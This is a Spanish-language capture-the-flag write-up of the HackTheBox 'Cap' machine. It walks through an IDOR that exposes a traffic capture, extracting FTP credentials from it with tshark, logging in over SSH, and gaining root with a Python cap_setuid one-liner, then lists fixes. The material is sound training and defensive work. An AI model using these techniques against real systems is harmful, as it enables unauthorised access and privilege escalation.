# Cap

**Platform:** HackTheBox (retired, Easy, Linux)
**Date:** 2026-07-18
**Vulnerability class:** IDOR + FTP cleartext credentials + Linux cap_setuid privesc

## Summary

La app web expone capturas de tráfico de red (pcaps) sin validar a quién pertenecen. Cambiando el ID en la URL se accede al pcap del sistema, que contiene credenciales FTP en cleartext. Con esas credenciales se entra por SSH y se escala a root explotando `cap_setuid` en Python3.

## Recon

```
nmap -Pn -T4 --open -vvv 10.129.53.42
```

Puertos abiertos: **21/tcp** (FTP), **22/tcp** (SSH), **80/tcp** (HTTP).

Empecé por el puerto 80. La URL al pedir una captura de tráfico era `/data/1` — número controlado por el cliente, señal inmediata de IDOR.

## Vulnerability

**IDOR (Insecure Direct Object Reference)** — el servidor no valida que el ID del pcap solicitado pertenezca al usuario autenticado. Cualquier usuario puede pedir `/data/0` y obtener la captura más antigua del sistema.

Causa raíz: el servidor confía en el ID que le manda el cliente sin cruzarlo contra la sesión activa.

Exposición secundaria: FTP transmite credenciales en cleartext, por lo que si alguien se autenticó por FTP mientras la captura estaba activa, esas credenciales quedan grabadas en el pcap.

## Exploitation

**1. IDOR → pcap del sistema**

Cambié `/data/1` por `/data/0` en el browser. La app devolvió el pcap sin validación.

**2. Análisis del pcap → credenciales FTP**

```bash
tshark -r 0.pcap -Y ftp
```

Credenciales en cleartext: `nathan:Buck3tH4TF0RM3!`

**3. Acceso inicial — SSH**

```bash
ssh nathan@<IP>
```

**4. Escalada de privilegios — cap_setuid**

```bash
getcap -r / 2>/dev/null
# /usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip

python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

`cap_setuid` permite llamar `setuid(0)` sin ser root. Python ejecuta código arbitrario → shell de root.

## Fix

- **IDOR:** validar en el servidor que el ID del pcap pertenece a la sesión activa antes de servirlo.
- **FTP cleartext:** reemplazar por SFTP o FTPS; no capturar tráfico de autenticación interna.
- **cap_setuid en Python:** no asignar capabilities a intérpretes de propósito general; usar binarios específicos y mínimos.

## Lessons learned

- IDs numéricos en URLs → primer lugar donde probar IDOR.
- FTP en el nmap → siempre buscar credenciales o capturar tráfico.
- `getcap -r / 2>/dev/null` va en el checklist estándar de privesc junto con `sudo -l` y SUID.
